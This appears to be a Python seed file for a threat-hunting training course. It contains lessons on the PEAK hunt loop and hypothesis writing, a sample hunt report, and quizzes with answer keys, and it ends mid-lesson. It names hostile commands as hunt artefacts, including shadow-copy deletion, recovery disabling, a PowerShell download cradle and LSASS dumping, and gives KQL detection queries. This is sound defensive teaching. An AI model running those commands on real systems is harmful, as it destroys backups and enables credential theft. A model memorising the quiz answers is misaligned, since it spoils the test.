            {"value": "trigger", "label": "Hunts are triggered by a hypothesis; IR is triggered by an alert / declared incident"},
            {"value": "disposition", "label": "When a hunt finds a true positive, the hunt continues into containment and forensics"},
            {"value": "rules", "label": "Hunts produce *ideas*; detection engineering produces *rules*. The TIDE / DE pipeline is the hand-off"},
            {"value": "fp_metric", "label": "Hunts and detection rules use the same FP-rate quality bar — both fail if FP rate exceeds 5%"},
            {"value": "stance", "label": "Hunting is proactive; IR is reactive; DE is engineering"},
        ],
        correct=["trigger", "rules", "stance"],
        explanation_md="True/false: trigger, rules-vs-ideas, and stance distinctions are correct. **False:** when a hunt finds a TP, the hunt *ends* and IR begins — the hunter does not run forensics under hunt-time discipline. **False:** hunts and rules have *different* quality bars — a hunt query with 100 manually-triaged results that finds one TP is a win; the same query as an unattended rule firing 100x/day is a tuning project.",
        points=3,
    )
    _add_q(session, l1q, order=3, kind=QuestionKind.SINGLE,
        stem_md="An L2 hunter is choosing between two hunt-query designs for the same suspected adversary. *Query A* matches against a list of 200 known-bad SHA-256 file hashes. *Query B* matches the *behavioural pattern* of `vssadmin delete shadows /all /quiet` followed by `net stop` against backup services within 10 minutes on the same host. According to the Pyramid of Pain *reframed for hunting*, which choice should the L2 prefer, and why?",
        options=[
            {"value": "a_cheap", "label": "Query A — hashes are cheap to author and high-confidence"},
            {"value": "a_long", "label": "Query A — hash-level hunts have the longest useful lifetime against a recompiling adversary"},
            {"value": "b_durable", "label": "Query B — TTP-level hunts are more expensive to author but force the adversary to re-engineer tradecraft, durable for years"},
            {"value": "b_easy", "label": "Query B — behavioural patterns are easier to author than hash lists"},
        ],
        correct="b_durable",
        explanation_md="The Pyramid of Pain reframed for hunting inverts L1's triage priority: hunt at the *top* of the pyramid (TTPs / tools / artefacts), not the bottom. Hashes are obsolete in a week (the adversary recompiles); the T1490 + T1489 chain in Query B forces the adversary to abandon ransomware staging entirely, which is the most expensive thing a defender can make them do.",
        points=2,
    )
    _add_q(session, l1q, order=4, kind=QuestionKind.TRUEFALSE,
        stem_md="Median dwell-time figures published in the major IR-retainer reports tell the L2 hunter that *most* of the cases hunting will help with are caught quickly — within a week or two of initial access — so hunting investment should focus on improving short-dwell detection.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="false",
        explanation_md="**False.** Median compression is driven by *loud* intrusions (ransomware self-disclosing on encryption) — the *quiet* intrusions (espionage tradecraft, identity-provider compromise, supply-chain access) sit in the long-tail with much longer dwell. Hunting is asymmetrically valuable on the long-tail *because the long-tail is what the rules didn't catch*. Reporting median dwell flatters the SOC; reporting *p95 dwell against cases the rules missed* is the metric hunting actually moves.",
        points=2,
    )

    # Lesson 1.3 — PEAK end-to-end
    l2 = _add_lesson(
        session, mod, order=3, title="The PEAK loop end-to-end (Prepare → Execute → Act → Know)",
        lesson_type=LessonType.READING, duration_min=26,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Walk the **PEAK** loop (Splunk SURGe, 2023) end-to-end with explicit time-budgets per phase
> 2. Know what activities belong in *Prepare*, *Execute*, *Act*, *Know* — and what belongs *out* of each
> 3. Compare PEAK to its predecessors (Sqrrl Hunting Loop, TaHiTI, Sqrrl Reference Model, NIST SP 800-150)
> 4. Recognise *iteration within phases* as legitimate (not phase confusion) and track time-budget drift
> 5. Apply the *sprint-hunt* pattern when fresh threat-intel demands a 90-minute timebox
>
> **Prerequisites.** Lesson 1 of this module — *Why hunt?*

## The PEAK loop

**PEAK** = *Prepare → Execute → Act → Know.* Authored by Splunk's SURGe team, published 2023. Designed as a successor to the Sqrrl Hunting Loop (Bianco, 2015) and TaHiTI (ABN AMRO / Rabobank, 2018), with cleaner phase separation, explicit time-budgeting, and first-class treatment of the hypothesis as a versioned artefact.

```mermaid
graph LR
    P[Prepare<br/>~20–30%] --> E[Execute<br/>~40–50%]
    E --> A[Act<br/>~15–20%]
    A --> K[Know<br/>~10–15%]
    K --> P
```

The percentages are SURGe's own time-budget guidance. They're not contracts — they're visibility. The discipline is to *know* which phase you're in and how much time you've spent there.

## Prepare (~20–30%)

Prepare is the planning phase. Done well, it makes the rest of the hunt cheap; done badly, the hunter ends up running queries with no idea what they're looking for.

Activities:

- **Pick the hunt topic.** Inputs: recent threat intelligence (a fresh CTI report on a relevant adversary), an unusual incident debrief (a new TTP observed), a coverage gap visible on the team's ATT&CK Navigator layer, a regulatory or sector concern (a CVE in your edge appliance fleet), or a scheduled rotation through high-priority techniques.
- **State the hypothesis** using the four-element template (Lesson 3). The hypothesis is the artefact that gets reviewed, criticised, and versioned through the hunt.
- **Identify the data sources.** What tables, indices, log streams will the hunt query? Confirm coverage and retention. *Logging gaps surface here* — many hunts end before Execute because the data the hypothesis requires doesn't exist.
- **Define success.** What concrete artefact would confirm the hypothesis? What would refute it? An honest answer to *"what would I conclude if I find nothing?"* lives here.
- **Choose the time window** explicitly in UTC, with both start and end. *"30 days back"* is sloppy; *"2026-03-29 00:00 UTC to 2026-04-28 00:00 UTC"* is correct.
- **Document intent.** What ATT&CK techniques are in scope? What's the disposition pathway for findings? Who reviews?

> **The 20–30% rule sounds high but is right.** The deeper Prepare is, the cheaper Execute becomes. Hunters who shortcut Prepare spend Execute reframing what they're looking for.

## Execute (~40–50%)

Execute is where the queries run. The discipline is *iteration with audit trail*.

Activities:

- **Translate the hypothesis to queries** — usually KQL (Defender Advanced Hunting / Sentinel), SPL (Splunk), or EQL (Elastic). The first query is broad — usually the four-element artefact converted directly to a filter. Subsequent queries narrow.
- **Pivot from discovery to enrichment to investigation.** A hunt is a tree, not a list. Each interesting result spawns enrichment queries (who owns this host? when was this account created? what else has this process touched?) and cross-data-source joins.
- **Capture every meaningful query and intermediate finding.** The hunt notes are the audit trail. They matter for the retro (Know phase), for the hand-off if the hunt converts to an incident (chain-of-custody), and for the next hunter who reuses the work.

A worked broad-to-narrow KQL example for a Rundll32 javascript hunt against Defender Advanced Hunting:

```kusto
// Q1 — Broad: every Rundll32 with javascript: in the command line, last 30 days
DeviceProcessEvents
| where Timestamp >= ago(30d)
| where FileName =~ "rundll32.exe"
| where ProcessCommandLine has "javascript:"
| project Timestamp, DeviceName, AccountName,
          ProcessCommandLine, InitiatingProcessFileName,
          InitiatingProcessCommandLine
| order by Timestamp desc

// Q2 — Narrowed: exclude known admin patterns and signed installer launchers
... | where InitiatingProcessFileName !in~
    ("msiexec.exe", "setup.exe", "installutil.exe")
| where AccountName !startswith "svc_" and AccountName !startswith "admin_"

// Q3 — Enrichment: for each survivor, pull the parent process tree
DeviceProcessEvents
| where Timestamp between (ago(30d) .. now())
| where DeviceName in ("HOST-A", "HOST-B")
| where InitiatingProcessFileName =~ "rundll32.exe"
   or FileName =~ "rundll32.exe"
| project Timestamp, DeviceName, AccountName,
          ProcessId, ParentProcessId, FileName, ProcessCommandLine,
          InitiatingProcessId, InitiatingProcessFileName
| order by DeviceName, Timestamp asc
```

Each query is a *committed step*. Don't keep one open browser tab and rewrite the query — capture each iteration so the audit trail is complete.

## Act (~15–20%)

Act is the disposition phase. Every result from Execute lands in one of five buckets:

- **True positive (TP)** — confirmed adversary behaviour. Hand off to IR with a *hunt-discovered* tag.
- **Benign true positive (BTP)** — the rule's logic fired for a real reason that turned out to be benign. Record the disposition. If a class of BTPs recurs across hunts, refine the hypothesis or flag for whitelist on detection-rule conversion.
- **False positive (FP)** — the rule's logic fired on something that wasn't even the behaviour described. Refine the query.
- **Inconclusive** — needs out-of-band verification (change-ticket lookup, owner contact, vendor verification). Move to a side-queue with an explicit follow-up owner; don't let it fall on the floor.
- **No findings** — the hunt's negative result. Document confidence-on-absence (Lesson 4).

End-of-Act activities:

- TP → IR handoff packet, with hunt report attached.
- Successful hunt → propose detection-rule conversion (TIDE / DE — Lesson 4).
- Negative-result hunt → write the confidence-on-absence statement.
- All hunts → finalise the hunt report.

## Know (~10–15%)

Know is the retrospective. The activity that, more than any other, distinguishes HM3 SOCs from HM2 SOCs.

Activities:

- **Retro on the hunt.** What worked? What didn't? What data was missing? What query patterns are reusable?
- **Update the team's knowledge.** Hunt-report repository entry. ATT&CK Navigator coverage layer update (red → orange → yellow → green, Lesson 4). Sigma rule submission if the analytic is shareable.
- **Feed the next hunt's Prepare.** Each Know phase produces a *"what I'd hunt next"* line. That line is the seed of the next hunt's topic-pick.

## Iteration within phases

PEAK is sometimes drawn as four discrete phases marching forward — but the lived experience of a hunt is more iterative. Mid-Execute, an analyst frequently discovers that the data source they planned to use lacks a field they need, and has to re-enter Prepare briefly to revise the hypothesis or pick a different source. Mid-Act, a single inconclusive finding may demand a fresh Execute pass to enrich it before disposition.

The discipline is *not* to refuse iteration — that produces brittle hunts — but to **track which phase you're in** at each moment, so the time budget remains visible. If a hunt that was supposed to spend 1.5 hours in Prepare has spent 4, the analyst should notice and either commit to the deeper Prepare (and replan the hunt's scope) or cut and proceed with what's known.

## The sprint-hunt pattern

PEAK is not the only valid pacing. **Sprint hunts** — 90-minute timeboxes for specific high-value, narrow-scope hypotheses — are increasingly common in mature SOCs, especially in response to fresh threat intelligence (*"CVE dropped 40 minutes ago, hunt the edge fleet now"*). Sprint hunts compress all four PEAK phases into a single sitting, with the hunt report written immediately after. They are not a different methodology; they are PEAK at a different scale.

## Predecessors and lineage

PEAK is not the first hunting methodology. Knowing its predecessors lets the L2 read older runbooks and adapt:

- **HEAT (Hunt Evil Advanced Techniques).** Early ad-hoc model. No formal phase split. Mostly a vocabulary.
- **Sqrrl Hunting Loop** (Bianco, 2015). The 2015 predecessor: *Trigger → Hypothesis → Investigate → Discover → Inform.* Strongly hypothesis-centred but lacks PEAK's explicit retrospective and time-budget discipline. Implicitly assumes hunts find something — has no native treatment of the negative-result case.
- **TaHiTI (Targeted Hunting integrating Threat Intelligence).** Dutch ABN AMRO and Rabobank methodology, 2018. Three phases (*Initiate → Hunt → Finalise*) with very strong threat-intelligence side. PEAK's *Prepare* phase generalises TaHiTI's *Initiate*.
- **Sqrrl Cyber Threat Hunting Reference Model.** Direct predecessor to PEAK; Sqrrl's framework before Splunk acquired Sqrrl (2018) and SURGe published PEAK.
- **NIST SP 800-150 — *Guide to Cyber Threat Information Sharing*.** The receive-side intelligence framework that feeds Prepare. Defines how a SOC consumes external CTI into actionable artefacts.

```mermaid
graph TB
    H[HEAT<br/>ad-hoc, no phases] --> S[Sqrrl Hunting Loop<br/>Trigger → Hypothesis → Investigate<br/>→ Discover → Inform]
    S --> T[TaHiTI<br/>Initiate → Hunt → Finalise<br/>strong CTI emphasis]
    S --> SR[Sqrrl Reference Model]
    T --> P[PEAK<br/>Prepare → Execute → Act → Know<br/>time-budgeted, hypothesis-first]
    SR --> P
    NIST[NIST SP 800-150<br/>CTI sharing framework] -.feeds Prepare.-> P
```

Where PEAK improves on its predecessors:

- **Cleaner phase split** with explicit time-budgeting (the percentages above).
- **Hypothesis becomes a first-class artefact** — versioned, criticisable, comparable across hunts.
- **Know phase makes negative results valuable.** Sqrrl's *Inform* is the closest analogue, but PEAK's framing of *"confidence on absence"* is sharper.
- **Compatible with detection-engineering hand-off** via TIDE / Sigma.

## Glossary

- **PEAK** — Prepare / Execute / Act / Know. SURGe's hunt methodology, 2023.
- **TaHiTI** — *Targeted Hunting integrating Threat Intelligence*. Dutch banking-sector methodology, 2018.
- **Sqrrl Hunting Loop** — Bianco's 2015 predecessor; *Trigger → Hypothesis → Investigate → Discover → Inform*.
- **Sprint hunt** — PEAK at 90-minute scale; for fresh-threat-intel response.

## Further reading

- Splunk SURGe — *PEAK Threat Hunting Framework* (2023 blog series + research paper).
- David Bianco — *The Hunting Loop* (Sqrrl, 2015).
- TaHiTI methodology paper — ABN AMRO / Rabobank, 2018.
- NIST SP 800-150 — *Guide to Cyber Threat Information Sharing.*
""",
    )
    l2q = _add_lesson(
        session, mod, order=4, title="PEAK loop — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on phase identification, time-budget rough-fit, predecessor-model comparison, and the role of the *Know* phase.",
    )
    _add_q(session, l2q, order=1, kind=QuestionKind.SINGLE,
        stem_md="An L2 hunter is mid-hunt. They have just finished filtering the result set down from 12 to 7 survivors using two narrowing clauses, and are about to pull a process-tree enrichment query for each survivor. Which PEAK phase are they in?",
        options=[
            {"value": "prepare", "label": "Prepare"},
            {"value": "execute", "label": "Execute"},
            {"value": "act", "label": "Act"},
            {"value": "know", "label": "Know"},
        ],
        correct="execute",
        explanation_md="Execute. Iterating queries — broad-to-narrow filtering followed by enrichment pivots — is the core of Execute. Disposition (TP/BTP/FP/inconclusive) belongs to Act; retrospective and Navigator-update belongs to Know; topic-pick and hypothesis-statement belongs to Prepare.",
        points=2,
    )
    _add_q(session, l2q, order=2, kind=QuestionKind.MULTI,
        stem_md="Per SURGe's PEAK time-budget guidance, which of the following are *roughly correct* time allocations for the four phases of a hunt?",
        options=[
            {"value": "p20", "label": "Prepare ~20–30%"},
            {"value": "e40", "label": "Execute ~40–50%"},
            {"value": "a15", "label": "Act ~15–20%"},
            {"value": "k10", "label": "Know ~10–15%"},
            {"value": "p50", "label": "Prepare ~5%, Execute ~80%, Act and Know split the remaining 15%"},
        ],
        correct=["p20", "e40", "a15", "k10"],
        explanation_md="SURGe's published guidance for PEAK is roughly 20–30 / 40–50 / 15–20 / 10–15 across the four phases. Skimping Prepare to 5% is a common anti-pattern that produces unfocused Execute and weak Know — the deeper Prepare is, the cheaper the rest of the hunt becomes.",
        points=3,
    )
    _add_q(session, l2q, order=3, kind=QuestionKind.SINGLE,
        stem_md="Which of the following is the *most accurate* description of how PEAK improves on its predecessor — the Sqrrl Hunting Loop (Bianco, 2015)?",
        options=[
            {"value": "more_phases", "label": "PEAK has more phases (eight vs five), giving finer-grained progress tracking"},
            {"value": "negative_results", "label": "PEAK adds the *Know* phase, which makes negative-result hunts valuable through explicit confidence-on-absence statements; Sqrrl's *Inform* is the closest analogue but lacks the negative-result framing"},
            {"value": "no_hypothesis", "label": "PEAK removed the hypothesis as a first-class artefact, making hunts faster"},
            {"value": "ai_first", "label": "PEAK requires an AI-driven query generator at every phase, which Sqrrl predates"},
        ],
        correct="negative_results",
        explanation_md="PEAK's *Know* phase formalises retrospective discipline and explicit negative-result documentation in a way Sqrrl's *Inform* does not. PEAK also adds explicit time-budgeting and elevates the hypothesis to a first-class versioned artefact. Phase counts and AI-tooling are not the distinguishing differences.",
        points=2,
    )
    _add_q(session, l2q, order=4, kind=QuestionKind.SHORTANSWER,
        stem_md="In one sentence, why does PEAK make the *Know* phase compulsory rather than optional? (One sentence.)",
        options=None,
        correct=[
            "negative results", "negative-result", "confidence on absence",
            "documents negatives", "documents absence",
            "captures negatives", "feeds prepare", "feeds the next hunt",
            "team knowledge", "navigator", "convert", "detection rule",
            "without know", "without it"
        ],
        explanation_md="Acceptable answers explain that *Know* converts every hunt — including those that found nothing — into team knowledge and the seed for the next hunt. The phase formalises the confidence-on-absence statement, the Navigator coverage update, and the hand-off to detection engineering. Without *Know*, hunts that find nothing are read as wasted effort and the SOC's hunting cadence shrinks.",
        points=2,
    )

    # Lesson 1.5 — The hypothesis itself
    l3 = _add_lesson(
        session, mod, order=5, title="The hypothesis: four-element + SMART, hypothesis types, criticism",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Frame a hunt hypothesis using the **four-element template** — TTP + artefact + data source + window
> 2. Apply **SMART-style criteria** — Specific, Measurable, Adversary-relevant, Realistic given data, Time-bounded
> 3. Identify weak hypotheses and rewrite them as strong ones
> 4. Distinguish the five **hypothesis types** — TTP-based, anomaly-based, situational-awareness, threat-actor-based, custom-detector-based
> 5. Apply the **hypothesis-criticism step** before Execute — base-rate, variants, null hypothesis
> 6. Recognise the three failure modes — *hypothesis-as-keyword*, *hypothesis-as-tool-list*, *hypothesis-as-fishing-trip*

## The four-element template

```mermaid
graph TB
    H((Hypothesis))
    TTP["1. TTP<br/>What behaviour?<br/>Ideally an ATT&amp;CK technique ID"]
    ART["2. Artefact<br/>What concrete observable?<br/>Process tree shape, command-line<br/>substring, network pattern"]
    DS["3. Data source<br/>Where would the artefact surface?<br/>DeviceProcessEvents, SecurityEvent 4624,<br/>SignInLogs, EmailEvents"]
    W["4. Window<br/>How far back / for how long ahead?<br/>Explicit UTC start/end"]

    TTP --- H
    ART --- H
    DS --- H
    W --- H
```

A *strong* hypothesis names all four. A *weak* one elides at least one — usually the data source or the window.

## Worked good vs weak

**Strong (four-element):**

> *In the past 30 days, an adversary has used T1218.011 (Rundll32) with `javascript:` as the command to execute remote scriptlets on at least one endpoint, observable in `DeviceProcessEvents` where `FileName == "rundll32.exe"` and `ProcessCommandLine` contains `"javascript:"`.*

This hypothesis is queryable in one line of KQL. The yes/no answer falls out of the query. The window is bounded. The technique is specified. The observable is concrete.

**Weak:**

> *There might be malware on the network.*

Every element is missing. There is no possible query that proves or refutes this. **Hunting begins by *not accepting weak hypotheses*.**

**Rewrite:**

> *In the past 14 days, ransomware-affiliate behaviour matching T1490 (Inhibit System Recovery) has occurred on at least one server, observable in `DeviceProcessEvents` where `vssadmin delete shadows` or `bcdedit /set recoveryenabled No` runs.*

Now it's hunt-able.

```mermaid
graph LR
    W["Weak<br/>'There might be malware on the network'"] --> Q1["Which technique?<br/>T1490 Inhibit System Recovery"]
    Q1 --> Q2["Which artefact?<br/>vssadmin delete shadows<br/>bcdedit /set recoveryenabled No"]
    Q2 --> Q3["Which data?<br/>DeviceProcessEvents"]
    Q3 --> Q4["Which window?<br/>14 days, UTC bounded"]
    Q4 --> S["Strong<br/>four-element hypothesis"]
```

## SMART-style criteria

A strong hypothesis is **S**pecific, **M**easurable, **A**dversary-relevant, **R**ealistic given data, **T**ime-bounded.

- **Specific.** Names the technique, the artefact, the data source. *"Lateral movement"* fails specificity; *"T1021.002 SMB / Windows Admin Shares with anomalous `AccountName` accessing `\\\\hostname\\C$`"* passes.
- **Measurable.** Has a clear yes/no answer when the data is queried. The query returns rows or it doesn't.
- **Adversary-relevant.** The technique appears in the threat profile of adversaries that target your sector. Hunting T1059.005 VBScript on a 100% Linux fleet is adversary-irrelevant. CTID's Top Techniques calculator is the input.
- **Realistic given data.** The data source actually exists and has retention covering the window. Hunting 90 days back when retention is 30 fails realism.
- **Time-bounded.** Explicit UTC start/end. *"Recently"* fails; *"2026-03-29 to 2026-04-28 UTC"* passes.

## Hypothesis types

Five hypothesis families recur consistently across SURGe, TaHiTI, and SANS FOR578:

| Type | Definition | Example seed |
|---|---|---|
| **TTP-based** | Pick a technique from ATT&CK and hunt for it. Most common. | "Hunt T1218.011 over 30 days." |
| **Anomaly-based** | Hunt for statistical deviation: rare-process, rare-domain, beacon-shape. | "Surface processes seen on ≤3 hosts in the last 7 days." |
| **Situational-awareness** | Current-event-relevant: a fresh CVE, a leaked zero-day, a sector incident. | "After CVE-2026-XXXX disclosure, hunt for exploitation indicators on edge appliance fleet." |
| **Threat-actor-based** | Pick a known adversary cluster, pull their ATT&CK Navigator layer, hunt for techniques they prefer that you don't have detections for. | "Hunt cluster-X's preferred T1486 / T1490 / T1027 chain across last 14 days." |
| **Custom-detector-based** | Hunt for behaviour one of your team's homegrown detection ideas would have caught — *before* authoring the rule, to validate base rate and FP shape. | "Hunt 'PowerShell -enc with parent winword.exe' over 30 days; measure FP rate; convert to rule if viable." |

Each type has a different sweet spot in the PEAK loop:

- **TTP-based hunts** plug directly into the four-element template.
- **Anomaly-based hunts** require a *baselining* step in Prepare (usually a 90-day rollup keyed by `SHA256` or `(FileName, IssuerName)`).
- **Threat-actor-based hunts** demand a Navigator-layer cross-walk between adversary techniques and existing coverage.
- **Situational-awareness hunts** are bounded by the *disclosure date*, the vendor, and the disclosed exploitation pattern.
- **Custom-detector-based hunts** output FP-rate measurement and a tuned rule submission, not a TP/BTP triage list.

## The hypothesis-criticism step

Before Execute, every hypothesis goes through criticism. Four questions, asked aloud or in the hunt notes:

1. **Is the data source likely to have what we need at the resolution we need?** Process events exist; do they include command line? Sign-in events exist; do they include the IP? Network flow exists; does it include SNI?
2. **What's the FP base rate on the artefact?** `whoami` runs everywhere, every minute, on every endpoint — hunting for raw `whoami` invocations is a noise generator. `nltest /domain_trusts` is rare and runs almost exclusively in adversary discovery sequences. Knowing the base rate is the difference between a useful hunt and an unreadable one.
3. **What variant escapes our query?** Adversary obfuscation (PowerShell `-enc`, escape characters, alternative tools), case variation, path-prefixed invocations, signed-binary proxies. Enumerate the variants you *won't* catch — they go in the residual-uncertainty statement.
4. **What's our null hypothesis?** What would we conclude if we found nothing? *"No findings + 95% endpoint coverage + 30-day retention + reliable telemetry → confidence-medium that this technique is not active."* If you can't articulate what null means, you can't write the negative-result statement, and the hunt's value is asymmetric.

A hypothesis that survives criticism is hunt-able. A hypothesis that doesn't goes back to Prepare for refinement.

## Three failure modes in hypothesis authoring

- **Hypothesis-as-keyword.** *"Hunt for `mimikatz`."* The analyst writes a string match and calls it a hypothesis. There's no technique mapping, no artefact specification beyond the string, no statement of what the query is meant to *prove*. The query runs, returns 0 hits because every modern operator renames or reflectively-loads, and the analyst writes "no findings." Nothing was learned. **Fix:** state the technique (T1003.001 LSASS dump), enumerate at least three artefact families (process invocation, process access with `0x1010` / `0x1410` rights to lsass.exe, MiniDumpWriteDump signatures), specify the data sources, then query.
- **Hypothesis-as-tool-list.** *"Hunt for `psexec`, `wmic`, `at.exe`, `schtasks`."* Closer to a hypothesis but still wrong. A list of tools is not an artefact specification; it conflates lateral movement (T1021), execution (T1059, T1569), and persistence (T1053). Each tool needs its own four-element treatment.
- **Hypothesis-as-fishing-trip.** *"Look for anomalies in process events."* No technique, no artefact, no measurable answer. This is exploratory data analysis, which is legitimate *but is not a hunt* — it produces no negative-result statement, no Navigator update, and no rule candidate. **Fix:** turn the EDA into a baseline study with its own report, then derive specific four-element hypotheses from the baseline's outliers.

Recognising these in the *next analyst's* hypothesis is the reviewer-grade skill. Recognising them in *your own* hypothesis is the hunter-grade skill.

## Glossary

- **Four-element template** — TTP / artefact / data source / window. Every strong hypothesis names all four.
- **SMART** — Specific, Measurable, Adversary-relevant, Realistic, Time-bounded.
- **Hypothesis types** — TTP-based / anomaly-based / situational-awareness / threat-actor-based / custom-detector-based.
- **Criticism step** — base-rate / variants / null hypothesis questioning before Execute.

## Further reading

- David Bianco — hypothesis-driven hunting series (Sqrrl, Splunk SURGe).
- TaHiTI methodology paper — strong threat-actor-based hypothesis treatment.
- SANS FOR578 — *Cyber Threat Intelligence* — for the threat-actor-layer cross-walk.
""",
    )
    l3q = _add_lesson(
        session, mod, order=6, title="The hypothesis — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on strong-vs-weak identification, missing-SMART-element identification, hypothesis-type classification, and the criticism step.",
    )
    _add_q(session, l3q, order=1, kind=QuestionKind.SINGLE,
        stem_md="A new analyst submits this hypothesis: *'Look for suspicious PowerShell activity on the fleet.'* Which **SMART** criterion fails *most prominently*?",
        options=[
            {"value": "spec", "label": "Specific — no technique, no artefact, no data source named"},
            {"value": "meas", "label": "Measurable — there is no clear yes/no answer when queried"},
            {"value": "adv", "label": "Adversary-relevant — PowerShell is not in any adversary's playbook"},
            {"value": "real", "label": "Realistic — the data source isn't available"},
            {"value": "time", "label": "Time-bounded — no UTC start/end"},
        ],
        correct="spec",
        explanation_md="The most prominent failure is *Specific* — no ATT&CK technique ID, no artefact pattern, no data source. Without those the hypothesis isn't queryable, which means *Measurable* and *Time-bounded* also fail downstream. The fix is to name a sub-technique (e.g. T1059.001), a concrete artefact (e.g. `-enc` or `IEX (New-Object Net.WebClient).DownloadString`), a data source (`DeviceProcessEvents`), and a UTC window.",
        points=2,
    )
    _add_q(session, l3q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following are valid **hypothesis types** in the L2 / SURGe / TaHiTI / FOR578 taxonomy?",
        options=[
            {"value": "ttp", "label": "TTP-based — pick a technique from ATT&CK and hunt for it"},
            {"value": "anom", "label": "Anomaly-based — hunt for statistical deviation (rare-process, rare-domain, beacon-shape)"},
            {"value": "sa", "label": "Situational-awareness — fresh CVE, leaked zero-day, sector incident"},
            {"value": "actor", "label": "Threat-actor-based — pull a cluster's Navigator layer, hunt for techniques they prefer"},
            {"value": "custom", "label": "Custom-detector-based — validate a candidate detection's FP shape before authoring it"},
            {"value": "vibes", "label": "Vibes-based — pick whatever feels suspicious today"},
        ],
        correct=["ttp", "anom", "sa", "actor", "custom"],
        explanation_md="Five recognised hypothesis families: TTP / anomaly / situational-awareness / threat-actor / custom-detector. *Vibes-based* is the *hypothesis-as-fishing-trip* failure mode — exploratory data analysis is a legitimate activity but is not a hunt because it produces no negative-result statement, no Navigator update, and no rule candidate.",
        points=3,
    )
    _add_q(session, l3q, order=3, kind=QuestionKind.SINGLE,
        stem_md="An L2 has stated this hypothesis: *'Hunt for any invocation of `whoami` on workstation endpoints in the last 30 days.'* Which output of the **hypothesis-criticism step** should reject this hypothesis as written?",
        options=[
            {"value": "data", "label": "The data source doesn't exist"},
            {"value": "base_rate", "label": "The FP base rate of `whoami` is so high that the artefact is a noise generator and the hunt isn't actionable as written"},
            {"value": "variants", "label": "Adversaries don't use `whoami`"},
            {"value": "null", "label": "There is no possible null hypothesis"},
        ],
        correct="base_rate",
        explanation_md="`whoami` runs on every endpoint many times a day in legitimate scripts and admin contexts. The base-rate criticism question — *what's the FP base rate on the artefact?* — should reject this hypothesis until it's narrowed (e.g. *whoami within a discovery cluster of ≥4 commands within 5 minutes from a non-admin account on a host that hasn't run that pattern before*). The criticism step is what catches base-rate failures before Execute.",
        points=2,
    )
    _add_q(session, l3q, order=4, kind=QuestionKind.TRUEFALSE,
        stem_md="A four-element hypothesis must always specify the **window** as an explicit UTC start and end (e.g. `2026-03-29 00:00 UTC → 2026-04-28 00:00 UTC`); phrases like *'recently'* or *'in the last 30 days'* are too imprecise for a strong hypothesis.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="true",
        explanation_md="**True.** Explicit UTC start/end is what makes the hunt comparable across runs and reproducible by another analyst. *'Recently'* is sloppy; *'in the last 30 days'* drifts every time the hunt is re-read. Time-bounded is the *T* in SMART, and is also load-bearing for the hunt-report's audit trail and the data-retention realism check.",
        points=2,
    )

    # Lesson 1.7 — Documenting + ION + worked T1218.011 scenario
    l4 = _add_lesson(
        session, mod, order=7, title="Documenting and learning: hunt reports, the negative-result discipline, ION surfaces, and a worked T1218.011 hunt",
        lesson_type=LessonType.READING, duration_min=26,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Fill out the **hunt-report template** — Hunt ID, hypothesis, queries, findings, verdict, confidence, action items, time-by-phase
> 2. Write a defensible **confidence-on-absence statement** that quantifies the negative
> 3. Convert a successful hunt to a TIDE detection rule via the five-gate hand-off
> 4. Update the team's ATT&CK Navigator coverage layer (red → orange → yellow → green) after each hunt
> 5. Apply ION-specific surfaces — hunt-tagged cases, AlertPromptTemplate matcher tier 2/3, the hunt repository, Bob's hunt-derived reasoning
> 6. Walk a complete worked PEAK hunt for **T1218.011 Rundll32 javascript** end-to-end

## The hunt-report template

Every hunt produces a structured report. The L2 fills it out *for every hunt*, including the ones that find nothing. The report travels — to the retro, to detection engineering, to the next hunter who picks up the same technique six months later.

```text
HUNT REPORT

Hunt ID:        H-2026-0042
Title:          Rundll32 javascript abuse — 30 day TTP hunt
Hunter:         analyst@example.org
Reviewer:       senior-analyst@example.org

HYPOTHESIS (verbatim, four-element):
  In the past 30 days, an adversary has used T1218.011 (Rundll32) with
  javascript: as the command to execute remote scriptlets on at least one
  endpoint, observable in DeviceProcessEvents where FileName == "rundll32.exe"
  and ProcessCommandLine contains "javascript:".

Hypothesis type:    TTP-based
ATT&CK mapping:     TA0005 Defense Evasion / T1218 / T1218.011
Data sources:       DeviceProcessEvents (Defender Advanced Hunting)
                    DeviceImageLoadEvents (used for enrichment)
Window:             2026-03-29 00:00 UTC → 2026-04-28 00:00 UTC

QUERIES RUN:
  Q1 — broad pattern match. Result count: 12.
  Q2 — exclude msiexec/setup/installutil parents. Result count: 8.
  Q3 — exclude svc_* and admin_* accounts. Result count: 7.
  Q4 — process-tree enrichment for survivors. Result count: 7 trees.
  Q5 — DNS/network correlation by DeviceId/Timestamp. Result count: 0
       outbound to non-corporate domains.

FINDINGS:
  TPs:           0
  BTPs:          7  (outdated installer scriptlets — 6 hosts running an
                    old vendor installer that legitimately uses rundll32
                    javascript: as a launcher)
  FPs:           4  (admin tooling matched by Q1 but excluded by Q2)
  Inconclusive:  1  (proxy-tool deployment paired with change ticket
                    CHG-2026-1187; awaiting IT-Ops confirmation)

VERDICT ON HYPOTHESIS:    refuted (no TPs)
CONFIDENCE ON NEGATIVE:   medium-high
  — coverage 96% endpoints (4 hosts off-domain)
  — 30-day retention confirmed across both data sources
  — query variants tested: case-insensitive, alt path prefix, embedded space
  — residual uncertainty: cannot exclude T1218.011 via:
    (a) renamed rundll32 binary
    (b) reflective-load alternatives invoking the same com objects
    (c) the 4 off-domain hosts where DeviceProcessEvents is sparse

ACTION ITEMS:
  - Detection rule proposal: H-2026-0042-DR (rundll32 javascript launcher
    with whitelist for VENDOR_X installer hashes)
  - Data gap: DeviceImageLoadEvents retention is 7 days; raise to 30
  - Follow-up hunt: T1218.010 regsvr32 /i: scriplet abuse — same pattern family

TIME SPENT BY PHASE:
  Prepare:  1.5h   (24%)
  Execute:  3.0h   (47%)
  Act:      1.0h   (16%)
  Know:     0.8h   (13%)
  Total:    6.3h
```

The template forces explicitness on every dimension that matters — the hypothesis is verbatim, the queries are archived, the disposition is bucketed, the negative is quantified, the next hunt is seeded.

## The negative-result discipline

